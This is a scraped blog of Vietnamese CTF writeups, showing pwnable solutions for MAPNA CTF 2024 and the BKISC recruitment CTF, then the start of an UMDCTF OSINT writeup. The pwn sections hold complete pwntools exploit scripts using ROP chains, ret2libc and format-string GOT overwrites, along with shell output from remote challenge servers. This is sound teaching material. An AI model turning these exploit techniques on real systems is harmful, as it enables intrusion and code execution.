printf(\u0026#34;Input: \u0026#34;); init_sandbox(); read(0, buf, 152uLL); return 0; } Hàm init_sandbox chủ yếu dùng để thêm rule cho seccomp chỉ cho phép một số lệnh gọi syscall cụ thể, đối với chương trình này thì là: open, close, read, write, mprotect, getdents và exit_group.\nĐúng như mình dự đoán, mục tiêu khai thác của chương trình này sẽ là leak được danh sách tên các file thông qua getdents và mở từng file ra đọc để kiếm flag.\nTuy nhiên thì trước đó thì mình phải leak được địa chỉ của libc vì bên trong chương trình chính không có đủ các hàm cần thiết để tiến hành đọc và in file. Chúng ta có thể leak địa chỉ libc bằng hàm printf cũng tương tự như thông thường khi làm với hàm puts (gọi printf lên GOT của printf).\nLên kịch bản khai thác # Sau một hồi nghịch qua nghịch lại thì mình có để ý thấy một điều rất thú vị mà không biết có phải là unintended hay không nhưng nhờ nó mà mình đã có thể solve được bài này mà không cần gọi getdents để leak tên các file.\nNếu để ý sẽ thấy trước khi flag được mang giấu đi thì nó đã nằm sẵn trong file generate_directory_tree.py và khi đọc kỹ Dockerfile sẽ nhận ra file generate_directory_tree.py sau khi được thực thi thì vẫn còn tồn tại trong cùng thư mục với file chương trình mà không bị xóa đi.\nĐiều này đồng nghĩa với việc mình chỉ cần gọi open-read-write lên file generate_directory_tree.py là đã có thể đọc được flag mà chẳng cần phải tốn công mò đúng tên file chứa flag trong thư mục maze.\nCó 2 điều cần phải lưu ý khi viết script khai thác:\nĐầu tiên là sau khi leak được địa chỉ libc nếu như quay trở lại hàm main thì khi hàm main gọi lại hàm init_sandbox sẽ dính lỗi và chương trình sẽ dừng ngay lập tức. Vậy nên chúng ta cần phải nhảy xuống câu lệnh phía dưới đó là main+42\n0x000000000040150a \u0026lt;+42\u0026gt;: lea rax,[rbp-0x20] Tuy nhiên thì điều này cũng sẽ dẫn đến vấn đề chính là vì không quay trở về đầu hàm main nên chúng ta không thể khỏi tạo giá trị rbp mới cho lần gọi hàm này. Do đó mà từ đoạn này trở xuống thì stack của chương trình sẽ được tính từ giá trị rbp cũ mà ra.\nChính vì vậy mà khi thực hiện stack overflow để leak địa chỉ libc mình sẽ phải đồng thời set rbp trỏ tới vùng nhớ nào đó có quyền read bên trong chương trình (ví dụ như .bss).\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) pop_args = 0x4014d9 # pop rdi; pop rsi; pop rdx; ret; ret = 0x4014dc rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 10000) # leak libc through printf (same technique with puts) payload = b\u0026#39;\\0\u0026#39; * 0x20 payload += p64(exe.bss(0x100)) # new rbp payload += p64(pop_args) payload += p64(exe.got[\u0026#39;printf\u0026#39;]) payload += p64(0) payload += p64(0) payload += p64(ret) payload += p64(exe.plt[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendlineafter(b\u0026#39;: \u0026#39;, payload) libc.address = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.symbols[\u0026#39;printf\u0026#39;] log.info(\u0026#39;libc.address: \u0026#39; + hex(libc.address)) Sau khi đã có địa chỉ libc rồi thì mình có thể tính được địa chỉ của các gadget pop_rax và syscall.\nTiếp theo là vấn đề thứ hai, vì ở hàm main chương trình chỉ đọc vào buffer 152 byte nên mình không thể ghi thẳng 1 chain open-read-write lên stack được.\nVấn đề này thì có 2 cách giải quyết: Hoặc là thực hiện lần lượt từng hành động open, read, write riêng biệt, mỗi lần thực hiện xong thì quay về main+42 để tiếp tục ghi đè lên stack bằng chain tiếp theo. Hoặc có thể tạo một chain trước đó để đọc vào trong stack số byte đủ lớn đủ chứa cả payload open-read-write (mình sử dụng cách này).\n# get new gadget from libc syscall = libc.address + rop.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0] pop_rax = libc.address + rop.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0] # 1st chain to read more bytes into the new stack payload = b\u0026#39;./generate_directory_tree.py\u0026#39;.ljust(0x20, b\u0026#39;\\0\u0026#39;) + p64(exe.bss(0x100)) payload += p64(pop_args) payload += p64(0) payload += p64(exe.bss(0x100+64)) payload += p64(0x100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) io.sendline(payload) Sau đó thì mình chỉ việc tạo payload là 1 chain open-read-write rồi ném hết vô trong stack là xong.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) pop_args = 0x4014d9 # pop rdi; pop rsi; pop rdx; ret; ret = 0x4014dc rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 10000) # leak libc through printf (same technique with puts) payload = b\u0026#39;\\0\u0026#39; * 0x20 payload += p64(exe.bss(0x100)) # new rbp payload += p64(pop_args) payload += p64(exe.got[\u0026#39;printf\u0026#39;]) payload += p64(0) payload += p64(0) payload += p64(ret) payload += p64(exe.plt[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendlineafter(b\u0026#39;: \u0026#39;, payload) libc.address = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.symbols[\u0026#39;printf\u0026#39;] log.info(\u0026#39;libc.address: \u0026#39; + hex(libc.address)) # get new gadget from libc syscall = libc.address + rop.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0] pop_rax = libc.address + rop.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0] # 1st chain to read more bytes into the new stack payload = b\u0026#39;./generate_directory_tree.py\u0026#39;.ljust(0x20, b\u0026#39;\\0\u0026#39;) + p64(exe.bss(0x100)) payload += p64(pop_args) payload += p64(0) payload += p64(exe.bss(0x100+64)) payload += p64(0x100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) io.sendline(payload) time.sleep(0.2) # 2nd chain: open-read-write # open payload = p64(pop_args) payload += p64(exe.bss(0x100)-0x20) payload += p64(0) payload += p64(0) payload += p64(pop_rax) payload += p64(2) payload += p64(syscall) # read payload += p64(pop_args) payload += p64(5) # fd on remote server (maybe will be 3 on your local) payload += p64(exe.bss(0x200)) payload += p64(100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) # write payload += p64(pop_args) payload += p64(1) payload += p64(exe.bss(0x200)) payload += p64(100) payload += p64(pop_rax) payload += p64(1) payload += p64(syscall) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendline(payload) io.interactive() $ python3 exp.py [*] Loaded 219 cached gadgets for \u0026#39;libc.so.6\u0026#39; [+] Opening connection to 3.75.185.198 on port 10000: Done [*] libc.address: 0x7ff5b1e8e000 [*] Switching to interactive mode import os import random import string flag = \u0026#34;MAPNA{d3lu510n-0f-pr073c710n-28fba2}\u0026#34; MIN_NAME_LENGT ","date":"21 January 2024","permalink":"/writeup/mapna-ctf-2024/","section":"Writeups","summary":"Writeup cho các thử thách mảng pwnable của giải MAPNA CTF 2024.","title":"MAPNA CTF 2024 - PWN writeup"},{"content":"","date":"21 January 2024","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"","date":"21 January 2024","permalink":"/","section":"RToSI","summary":"","title":"RToSI"},{"content":"","date":"21 January 2024","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"21 January 2024","permalink":"/writeup/","section":"Writeups","summary":"","title":"Writeups"},{"content":"","date":"11 November 2023","permalink":"/tags/2023/","section":"Tags","summary":"","title":"2023"},{"content":"","date":"11 November 2023","permalink":"/tags/bkisc/","section":"Tags","summary":"","title":"BKISC"},{"content":"Easter Egg # Mô tả: People don\u0026rsquo;t believe me when I say that you can still do a ret2libc with just one-byte overflow. Maybe you can prove them wrong by talking to my easter bunny.\nNote: Có ai tin được là tui tính để bài này ra hôm thi onsite không? =)))\nSetup # Đề bài cung cấp cho mình 3 file: chall, libc.so.6, ld-2.35.so. Từ điểm này công với việc đọc sơ qua mô tả của đề thì khả năng cao là phải thực hiện kỹ thuật ret2libc để chiếm shell chương trình và đọc flag.\nChính vì đề cung cấp cho mình các file libc và loader để debug ở local giống với môi trường trên remote thì việc đầu tiên cần phải làm đó chính là link các file này lại với file thử thách. Để tự động hóa việc này thì các bạn có thể sử dụng pwninit.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-2.35.so copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall $ ls chall flag.txt ld-2.35.so libc.so.6 solve.py $ ldd chall linux-vdso.so.1 (0x00007fff4c8fa000) libc.so.6 =\u0026gt; ./libc.so.6 (0x00007fa15f83e000) ./ld-2.35.so =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007fa15fa68000) Vậy là việc link file challenge và libc đã hoàn thành.\nPhân tích source code # Các bạn có thể sử dụng tùy ý các Decompiler khác nhau để tiến hành việc đọc code của chương trình. Mình thì sử dụng IDA Free vì nó miễn phí và hỗ trợ file ELF 64-bit. Nếu bạn giàu thì có thể dùng bản Pro luôn cho máu.\nThông qua IDA, mình nhận thấy rằng chương trình có 3 hàm chính là main, find_the_bunny và to_the_moon. Pseudocode của hàm main mà IDA decompile ra được như sau:\nint __cdecl main(int argc, const char **argv, const char **envp) { setbuf(stdin, 0LL); setbuf(_bss_start, 0LL); puts(\u0026#34;I heard the easter bunny wanna talk to you, but it\u0026#39;s no where to be seen.\u0026#34;); puts(\u0026#34;Can you find it?\u0026#34;); return find_the_bunny(); } Ở đây không có gì đặc biệt ngoài việc setup các buffer và sau đó gọi hàm find_the_bunny. Mình sẽ kiểm tra hàm này tiếp theo.\nssize_t find_the_bunny() { char buf[48]; // [rsp+0h] [rbp-30h] BYREF puts(\u0026#34;Due to limited stamina, you can only overwrite 1 byte.\u0026#34;); return read(0, buf, 57uLL); } Hàm tạo một buffer 48 byte ở vị trí rbp-0x30, tức là buffer này cách rbp là 48 byte. Vậy thì nó sẽ cách địa chỉ trả về của hàm find_the_bunny là 56 byte (tính bằng khoảng cách với rbp + 8). Hàm này cho mình viết lên stack 57 byte cũng chính là chỉ cho phép ghi đè lên byte đầu tiên của địa chỉ trả về.\nNgoài ra thì còn một hàm nữa là to_the_moon mà không được gọi tới ở bất kỳ chỗ nào trong chương trình. Mình đoán là mục tiêu trước mắt là phải gọi được hàm này. Vậy nên mình sẽ thử xem nó có gì trước đã.\nssize_t to_the_moon() { char buf[48]; // [rsp+0h] [rbp-30h] BYREF puts(\u0026#34;You have found the easter bunny!\u0026#34;); puts(\u0026#34;It gave you a lot of stamina potions.\u0026#34;); return read(0, buf, 100uLL); } Hàm này cũng tạo một buffer 48 byte ở vị trí rbp-0x30 nhưng lại đọc input đến tận 100 byte, cũng tức là mình có thể overflow stack đủ nhiều để sử dụng kỹ thuật ret2libc mà chiếm shell của chương trình.\nLên kịch bản khai thác # Như đã phân tích ở trên, hàm to_the_moon sẽ là target chính nên mình phải bằng cách nào đó gọi được hàm này để khai thác lỗi buffer overflow để áp dụng kỹ thuật ret2libc chiếm shell chương trình.\nHàm find_the_bunny chỉ cho mình ghi đè lên được byte đầu tiên của địa chỉ trả về, nhưng vì các hàm này đểu thuộc chương trình gốc mà không phải hàm của libc nên trên lý thuyết thì chúng được đặt gần nhau và do đó có thể chỉ cần ghi đè 1 byte thôi cũng đủ để nhảy qua hàm khác được.\nVậy hướng khai thác của mình có thể tóm gọn lại như sau:\nOverflow 1 byte của hàm find_the_bunny để nhảy tới hàm to_the_moon. Lợi dụng lỗi buffer overflow của hàm to_the_moon để ret2libc và chiếm shell chương trình. Tiến hành debug # Có khá nhiều plugin cho gdb để việc debug trở nên dễ dàng hơn nhưng đối với người chơi pwn thì thường sử dụng nhất là pwndbg.\nNếu các bạn đã tới được bước này rồi thì đương nhiên sẽ gặp được chướng ngại lớn nhất của đề.\nKhi tiến hành debug địa chỉ trả về của find_the_bunny, mình nhận thấy rằng ở luồng thực thi thông thường chương trình sẽ nhảy về địa chỉ lệnh main+82 tức là tại\n0x0000000000401240 \u0026lt;main+82\u0026gt;: jmp 0x401264 \u0026lt;main+118\u0026gt; Tuy nhiên, địa chỉ bắt đầu của hàm to_the_moon lại nằm ở 0x401176, 2 địa chỉ này khác biệt nhau tận 2 byte và do đó, việc ghi đè 1 byte để nhảy từ địa chỉ trả về của hàm find_the_bunny đến hàm to_the_moon là bất khả thi.\nNếu các bạn tới được đây và cho rằng hết cách rồi, hoặc đi xin tác giả được ghi đè lên 2 byte thì không nhé. Vì chương trình này còn 1 thứ rất hay mà chỉ khi debug thì mới biết được.\nĐiểm bất thường của chương trình # Khi disassemble hàm main ra thì mình có được đoạn code assembly sau:\npwndbg\u0026gt; disass main Dump of assembler code for function main: 0x00000000004011ee \u0026lt;+0\u0026gt;: endbr64 0x00000000004011f2 \u0026lt;+4\u0026gt;: push rbp 0x00000000004011f3 \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000004011f6 \u0026lt;+8\u0026gt;: mov rax,QWORD PTR [rip+0x2e53] # 0x404050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000004011fd \u0026lt;+15\u0026gt;: mov esi,0x0 0x0000000000401202 \u0026lt;+20\u0026gt;: mov rdi,rax 0x0000000000401205 \u0026lt;+23\u0026gt;: call 0x401070 \u0026lt;setbuf@plt\u0026gt; 0x000000000040120a \u0026lt;+28\u0026gt;: mov rax,QWORD PTR [rip+0x2e2f] # 0x404040 \u0026lt;stdout@@GLIBC_2.2.5\u0026gt; 0x0000000000401211 \u0026lt;+35\u0026gt;: mov esi,0x0 0x0000000000401216 \u0026lt;+40\u0026gt;: mov rdi,rax 0x0000000000401219 \u0026lt;+43\u0026gt;: call 0x401070 \u0026lt;setbuf@plt\u0026gt; 0x000000000040121e \u0026lt;+48\u0026gt;: lea rdi,[rip+0xe6b] # 0x402090 0x0000000000401225 \u0026lt;+55\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x000000000040122a \u0026lt;+60\u0026gt;: lea rdi,[rip+0xea9] # 0x4020da 0x0000000000401231 \u0026lt;+67\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x0000000000401236 \u0026lt;+72\u0026gt;: mov eax,0x0 0x000000000040123b \u0026lt;+77\u0026gt;: call 0x4011b8 \u0026lt;find_the_bunny\u0026gt; 0x0000000000401240 \u0026lt;+82\u0026gt;: jmp 0x401264 \u0026lt;main+118\u0026gt; 0x0000000000401242 \u0026lt;+84\u0026gt;: lea rdi,[rip+0xea7] # 0x4020f0 0x0000000000401249 \u0026lt;+91\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x000000000040124e \u0026lt;+96\u0026gt;: xor rdi,rdi 0x0000000000401251 \u0026lt;+99\u0026gt;: mov rsi,rsp 0x0000000000401254 \u0026lt;+102\u0026gt;: add rsi,0x8 0x0000000000401258 \u0026lt;+106\u0026gt;: mov rdx,0x8 0x000000000040125f \u0026lt;+113\u0026gt;: call 0x401080 \u0026lt;read@plt\u0026gt; 0x0000000000401264 \u0026lt;+118\u0026gt;: nop 0x0000000000401265 \u0026lt;+119\u0026gt;: pop rbp 0x0000000000401266 \u0026lt;+120\u0026gt;: ret End of assembler dump. Thấy điều gì kỳ lạ không???\nTại main+77, chương trình tiến hành gọi hàm find_the_bunny và set địa chỉ trả về tại main+82. Tuy nhiên, khi đến địa chỉ lệnh tại main+82 chương trình lại nhảy thẳng xuống main+118 tức là khúc mà hàm main kết thúc, hoàn toàn bỏ qua hẳn một đoạn 7 dòng code assembly nằm giữa.\nCũng chính bởi câu lệnh jmp 0x401264 \u0026lt;main+118\u0026gt; đặc biệt này mà các decompiler đã bị đánh lừa và nghĩ rằng hàm main sau khi gọi find_the_bunny sẽ kết thúc. Xin chúc mừng bạn vừa tìm đc Easter Egg của chương trình, cũng chính là tên của đề.\nQuay trở lại vấn đề chính, mình có thể đọc thử và đoán xem đoạn này chương trình sẽ làm gì.\nĐầu tiên là khúc\n0x0000000000401242 \u0026lt;+84\u0026gt;: lea rdi,[rip+0xea7] # 0x4020f0 0x0000000000401249 \u0026lt;+91\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; có lẽ chương trình sẽ in ra một string nào đó. Cái này thừa thải nên mình không cần để ý thêm.\nTiếp theo là đoạn còn lại này:\n0x000000000040124e \u0026lt;+96\u0026gt;: xor rdi,rdi 0x0000000000401251 \u0026lt;+99\u0026gt;: mov rsi,rsp 0x0000000000401254 \u0026lt;+102\u0026gt;: add rsi,0x8 0x0000000000401258 \u0026lt;+106\u0026gt;: mov rdx,0x8 0x000000000040125f \u0026lt;+113\u0026gt;: call 0x401080 \u0026lt;read@plt\u0026gt; Khi phân tích kỹ ra thì khúc này chương trình sẽ đọc 8 byte input của mình và lưu nó ở rsp+8. Mà rsp+8 của hàm main khi này sẽ là chính địa chỉ trả về của hàm main luôn.\nVậy tức là nếu mình tới được đoạn này thì sẽ có thể ghi đè lên địa chỉ trả về của main và từ đó nhảy tới được hàm to_the_moon. Và điều này hoàn toàn có thể thực hiện được do đoạn code assembly này nằm ngay dưới địa chỉ lệnh mà hàm find_the_bunny sẽ trở về sau khi kết thúc mà do đó chỉ khác biệt nhau đúng duy nhất 1 byte đầu tiên.\nLên kịch bản khai thác lần 2 # Vậy hướng khai thác mới sẽ là như sau:\nOverflow 1 byte của hàm find_the_bunny để nhảy tới đoạn bị ẩn của hàm main tại main+84. Viết đè lên địa chỉ trả về của hàm main để nhảy tới hàm to_the_moon. Lợi dụng lỗi buffer overflow của hàm to_the_moon để ret2libc và chiếm shell chương trình. Viết script khai thác # Mình để ý là ai mở ticket để hỏi về bài này cũng đều biết cách khai thác nhưng không thành công do chủ yếu scripting còn hơi lỏ đấy nhá\nfrom pwn import * context.binary = exe = ELF(\u0026#39;./chall\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) #io = process() #gdb.attach(io, api=True) io = remote(\u0026#39;34.87.54.101\u0026#39;, 4204) pop_rdi = 0x4012d3 # Stage 1: jump to the vulnerable function payload = b\u0026#39;i\u0026#39;*0x38 + b\u0026#39;\\x42\u0026#39; io.sendafter(b\u0026#39;byte.\\n\u0026#39;, payload) io.sendafter(b\u0026#39;more!\\n\u0026#39;, p64(exe.sym[\u0026#39;to_the_moon\u0026#39;])) # Stage 2: leak libc payload = b\u0026#39;i\u0026#39;*0x38 + p64(pop_rdi) + p64(exe.got[\u0026#39;puts\u0026#39;]) + p64(exe.plt[\u0026#39;puts\u0026#39;]) payload += p64(exe.sym[\u0026#39;to_the_moon\u0026#39;]) # Back to the vulnerable function to continue exploiting io.sendafter(b\u0026#39;potions.\\n\u0026#39;, payload) libc.address = u64(io.recvline(keepends=False).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] log.info(f\u0026#39;Libc base: {hex(libc.address)}\u0026#39;) # Stage 3: ret2system payload = b\u0026#39;i\u0026#39;*0x38 + p64(pop_rdi) + p64(libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__()) + p64(libc.sym[\u0026#39;system\u0026#39;]) io.sendafter(b\u0026#39;potions.\\n\u0026#39;, payload) io.interactive() Chạy script và lấy flag thôi nào\n$ python exp.py [+] Opening connection to 34.87.54.101 on port 4204: Done [*] Libc base: 0x7f83a8c58000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt BKISC{0n3_c4n_35c4p3_7h3_3y3s_0f_th3_d3c0mp1l3r_bu7_n0t_7h3_d3bu99er} You Can\u0026rsquo;t See Me # Mô tả: The real magic is things that happen when your eyes can not see.\nSetup # Tương tự như trên, đề cũng cho 3 file: chall, libc.so.6, ld-linux-x86-64.so.2. Mình sẽ link lại chúng trước để tiện cho việc debug sau này hơn.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall $ ls chall flag.txt ld-linux-x86-64.so.2 libc.so.6 solve.py $ ldd chall linux-vdso.so.1 (0x00007ffd12af3000) libc.so.6 =\u0026gt; ./libc.so.6 (0x00007fefb2b5b000) ./ld-linux-x86-64.so.2 =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007fefb2d85000) Phân tích source code # Chương trình chỉ có 2 hàm chính là main và get_msg. Như thường lệ thì mình sẽ coi hàm main trước.\nint __cdecl main(int argc, const char **argv, const char **envp) { char buf[40]; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(\u0026#34;Wanna see me do a magic trick?\u0026#34;); puts(\u0026#34;Give me your message and I\u0026#39;ll see what I can do.\u0026#34;); get_msg(); puts(\u0026#34;Voila! Your message is now gone. Give me another:\u0026#34;); read(0, buf, 0x64uLL); return v6 - __readfsqword(0x28u); } Dễ dàng nhận thấy rằng ở hàm main bị dính một lỗi buffer overflow nghiêm trọng. Tuy nhiên chương trình đã bật chế độ bảo vệ Canary nên mình không thể cứ thế mà overwrite được giá trị trên stack. Vậy nên hãy chuyển qua phân tích hàm get_msg tiếp theo nào.\nunsigned __int64 get_msg() { FILE *stream; // [rsp+8h] [rbp-D8h] char s[200]; // [rsp+10h] [rbp-D0h] BYREF unsigned __int64 v3; // [rsp+D8h] [rbp-8h] v3 = __readfsqword(0x28u); stream = fopen(\u0026#34;/dev/null\u0026#34;, \u0026#34;w\u0026#34;); if ( stream ) { printf(\u0026#34;\u0026gt; \u0026#34;); fgets(s, 144, stdin); fprintf(stream, s); } printf(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\\n\u0026#34;); return v3 - __readfsqword(0x28u); } Ở hàm này chương trình đọc vào input của mình nhập vô biến s sau đó tiến hành gọi hàm fprintf để in format từ biến s sang file /dev/null. Và cũng như tất cả các hàm thuộc họ printf khác, vì không chỉ định trước format mà in thẳng buffer người dùng nhập vào cho nên hàm này cũng bị dính lỗi format string. Còn hàm printf kia thì do chỉ in ra 1 string cố định mà có lẽ sẽ không thể bị khai thác được.\nMặc dù fprintf dính lỗi format string nhưng tất cả output đều đã được đưa vào bên trong file /dev/null và do đó không thể leak được giá trị trên stack bằng hàm này. Tuy nhiên cũng vì mang lỗi format string mà fprintf cũng có thể bị khai thác để tiến hành việc ghi đè dữ liệu lên các vùng nhớ khác tương tự như các hàm thuộc họ printf.\nNgoài ra, thông thường chương trình sẽ lưu các string cố định vào vùng nhớ .rodata (read only data) nhưng khi nhấp chuột vào string bên trong hàm printf kia thì nó lại dẫn mình đến vùng nhớ .data, tức nó là một biến global? Thậm chí nó còn có tên biến là msg nữa cơ.\nDo vùng nhớ .data có thể được ghi đè lên nên mình có thể thay đổi string này để khi chạy hàm printf sẽ dính lỗi format string và từ đó leak được giá trị trên stack ra ngoài.\nĐối với những người chơi pwn lâu năm thì sẽ dễ nhận ra điều này hơn do tính tối ưu khi compiler của gcc sẽ tự động biến câu lệnh\nprintf(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\\n\u0026#34;); thành\nputs(\u0026#34;Hippity hoppity, now you see me, now you don\u0026#39;t. Funni\u0026#34;); nên không thể nào có chuyện một đoạn code như thế nằm chình ình trong chương trình mà cái string đó lại không phải là biến global được.\nVà đương nhiên việc có thể ghi đè lên được string này thì mình có thể tận dụng lỗi của hàm fprintf ở trước đó để khai thác. Nếu đã tới được đây rồi thì việc khai thác còn lại sẽ rẽ nhiều hướng khác nhau tùy thuộc vào chọn lựa của các bạn thôi.\nLên kịch bản khai thác # Cho dù hướng đi của các bạn có là gì đi chăng nữa thì đều phải qua được một bước chung nhất đó chính là ghi đè lên biến msg để leak được giá trị trên stack ra và từ đó có thể khai thác theo nhiều kiểu khác nhau, tiêu biểu như:\nDùng fprintf để leak giá trị libc bằng printf đồng thời ghi đè lên GOT của hàm read hoặc hàm __stack_chk_fail thành địa chỉ của hàm main để chương trình quay trở về hàm main khi trigger 1 trong 2 hàm này. Sau đó lại tiếp tục khai thác hàm fprintf để ghi đè GOT của hàm printf thành system và ghi đè biến msg thành string \u0026ldquo;sh\u0026rdquo; để khi chương trình gọi printf(msg) thì nó sẽ gọi system(\u0026ldquo;sh\u0026rdquo;).\nDùng fprintf để leak giá trị libc và canary bằng printf sau đó lợi dụng lỗi buffer overflow của hàm main khi gọi read để ghi đè lên stack giá trị canary đúng sau đó tiếp tục overflow xuống dưới để ret2system và chiếm shell.\nDùng fprintf để leak giá trị libc ằng printf đồng thời ghi đè lên GOT của hàm __stack_chk_fail bằng câu lệnh ret để khiến nó trở nên vô dụng sau đó cũng khai thác việc gọi read ở hàm main để ret2system.\nĐối với mình thì mình sẽ sử dụng cách đầu tiên nhé.\nTiến hành debug # Việc debug ở đây cũng không có gì đáng chú ý, chủ yếu là mình đặt breakpoint ở 2 thời điểm lúc gọi fprintf và printf để xem buffer của mình ở offset thứ mấy trên stack (cho việc ghi đè bằng hàm fprintf) cũng như là của các giá trị cần tìm như libc, canary (cho việc leak).\nĐầu tiên là dừng tại lúc gọi hàm fprintf:\nChuỗi mình nhập vào nằm ở index thứ 2 trên stack, do hàm fprintf nhận vào tối thiểu 2 argument mà index thứ 0 trên stack sẽ bắt đầu ở offset thứ 5 chứ không phải thứ 6 như khi gọi printf. Qua đó mình biết được input buffer của mình nằm ở offset thứ 7.\nNgoài ra thì nếu các bạn muốn biết khi gọi hàm fprintf sẽ in cái gì vào /dev/null thì trong gdb trước khi chương trình gọi hàm này có thể dùng lệnh set $rdi=stdout để pipe output của hàm vào stdout thay vì vào /dev/null.\nTiếp theo mình sẽ dừng tại đoạn gọi printf:\nCác bạn có thể sử dụng lệnh stack \u0026lt;n\u0026gt; với n là số dòng trên stack muốn xem để có thể quan sát được các giá trị trong stack ở dưới sâu hơn. Dưới đây là kết quả của 30 giá trị trên stack:\nMình nhận thấy rằng có thể leak được giá trị của hàm puts+346 ở index thứ 0x15 (21) trên stack, tức là offset thứ 27 vì đây là hàm printf. Nếu các bạn muốn leak được thêm canary thì nó nằm ở offset 33 đấy.\nNhư mọi lần giải các thử thách pwnable thì sau đó là 1 khoảng thời gian cồng kềnh để debug kiểm tra từng bước trong script mình viết đã đúng hay chưa, việc ghi đè có đúng giá trị hay không,\u0026hellip; Nhưng chung quy lại thì đến đây là đã xong được 90% rồi, còn lại thì chỉ có viết script thôi.\nViết script khai thác # Lại 1 lần nữa xin được nhắc nhở người biết cách giải bài này mà toàn bị chặn do script lỏ nhé. Tạo ticket mà thấy 80% là làm được nhưng toàn bị vấn đề scripting.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;./chall\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) script = \u0026#39;\u0026#39;\u0026#39;b* get_msg+144 b* main+124 c \u0026#39;\u0026#39;\u0026#39; # io = process() # gdb.attach(io, gdbscript=script, api=True) io = remote(\u0026#39;34.124.216.27\u0026#39;, 4200) # make GOT read function call main + leak libc puts+346 by overwriting the msg at printf payload = fmtstr_payload(7, {exe.got[\u0026#39;read\u0026#39;]:exe.sym[\u0026#39;main\u0026#39;], exe.sym[\u0026#39;msg\u0026#39;]:b\u0026#39;%27$p\u0026#39;}, write_size=\u0026#39;short\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, payload) io.recvuntil(b\u0026#39;0x\u0026#39;) libc.address = int(io.recvuntil(b\u0026#39;t\u0026#39;)[:-1], 16) - (libc.sym[\u0026#39;puts\u0026#39;]+346) log.info(f\u0026#39;Libc base: {hex(libc.address)}\u0026#39;) payload = fmtstr_payload(7, {exe.got[\u0026#39;printf\u0026#39;]:libc.sym[\u0026#39;system\u0026#39;], exe.sym[\u0026#39;msg\u0026#39;]:b\u0026#39;sh\\0\u0026#39;}, write_size=\u0026#39;short\u0026#39;) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, payload) io.interactive() Chạy script rồi lấy flag thôi.\n$ python exp.py [+] Opening connection to 34.124.216.27 on port 4200: Done [*] Libc base: 0x7feada27e000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt BKISC{th3_m4g1k_0f_l34kl3s5_f0rm4t_1s_7h4t_y0u_c4n_5t1ll_wr1t3} ","date":"11 November 2023","permalink":"/writeup/bkisc_recruit/","section":"Writeups","summary":"Writeup cho các thử thách mảng pwnable của giải CTF tuyển quân CLB ATTT BKISC.","title":"BKISC Recruitment CTF - PWN writeup"},{"content":"","date":"2 May 2023","permalink":"/tags/osint/","section":"Tags","summary":"","title":"osint"},{"content":"","date":"2 May 2023","permalink":"/tags/umdctf/","section":"Tags","summary":"","title":"UMDCTF"},{"content":"TCC1 # Given website: Click here!\nDescription: I found this hacker group and they\u0026rsquo;re acting kinda strange. Let\u0026rsquo;s do some diggin\u0026rsquo;. Maybe we can find their discord server? I thought they linked it on their website before\u0026hellip;\nCategory: OSINT\nFrom the description, we know that the hacker group had linked their Discord server before. By pasting the website URL https://tcc.lol into the Wayback Machine, we successfully gained access to the deleted link of the Discord server!\nExamining the description of the welcome channel, we find the flag UMDCTF{w3lc0me_t0_th3_b35t_d!sc0rd_982364}\nTCC2 # Description: What is the secret page on their website?\nThe secret page contains four questions. We must answer all of them correctly to access the flag.\nThe first question: What place did TCC get in their most recent CTF competition? After researching their team, we found them on ctftime. They only participated in DawgCTF 2023 and ranked 145th.\nThe second question: Which company is p1ku currently working for? We searched for 